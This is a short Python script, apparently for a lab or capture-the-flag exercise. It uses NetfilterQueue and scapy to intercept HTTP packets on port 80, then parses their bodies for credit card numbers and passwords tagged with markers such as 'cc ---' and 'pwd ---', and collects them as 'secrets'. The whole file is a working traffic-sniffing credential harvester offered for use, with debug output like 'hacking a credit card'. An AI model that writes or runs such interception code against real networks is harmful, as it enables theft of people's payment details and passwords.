from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import json
import re

DEBUG_VERBOSITY = 0
DEBUG_DEF_VERBO = 2

secrets = set()

def add_secret(s):
    n = len(secrets)
    secrets.add(s)
    if n < len(secrets):
        debug(str(len(secrets)) + " SECRETS FOUND", 0)
        debug(list(secrets), 0)

def debug(s, level=DEBUG_DEF_VERBO):
    if level <= DEBUG_VERBOSITY:
        print(str(s))

def handler(pkt):
    ip = IP(pkt.get_payload())
    if ip.haslayer(TCP) and ip[TCP].dport == 80:
        # debug(pkt, 0)
        #debug(pkt.get_payload())
        """
            debug("tcp")
            debug(tcp)
        # """
        if ip.haslayer(Raw):
            http = ip[Raw].load.decode()
            #debug("http:")
            #debug(http)
            http_header_parsed = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", http))
            if http_header_parsed['Content-Type'] == "application/json":
                try:
                    json_data_str = re.findall(r'{[^)]+}', http)[0]
                    json_data = json.loads(json_data_str)
                    debug(pkt)
                    debug(http)
                    debug("voila:")
                    debug(json_data, 0)
                except:
                    try:
                        raw_content = re.findall(r'"[^)]+"', http)[0]
                        if 'cc ---' in raw_content:
                            debug("hacking a credit card:")
                            try:
                                cc = re.findall(r'\b[0-9][0-9][0-9][0-9]\.[0-9][0-9][0-9][0-9]\.[0-9][0-9][0-9][0-9]\.[0-9][0-9][0-9][0-9]\b', raw_content)[0]
                                debug("SUCCESS=" + cc, 1)
                                add_secret(cc)
                            except:
                                try:
                                    cc = re.findall(r'\b[0-9][0-9][0-9][0-9]\/[0-9][0-9][0-9][0-9]\/[0-9][0-9][0-9][0-9]\/[0-9][0-9][0-9][0-9]\b', raw_content)[0]
                                    debug("SUCCESS=" + cc, 1)
                                    add_secret(cc)
                                except:
                                    debug("failed")
                                    debug(raw_content)
                        elif 'pwd ---' in raw_content:
                            debug("hacking a password:")
                            try:
                                pwd = re.findall(r'pwd --- [A-Z0-9;:<>=?@]{8,30}', raw_content)[0][8:]
                                debug("SUCCESS=" + pwd, 1)
                                add_secret(pwd)
                            except:
                                debug("failed")
                                debug(raw_content)
                    except:
                        debug("nothing here")

    pkt.accept()
        

#hi
nfqueue = NetfilterQueue()
nfqueue.bind(0, handler)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
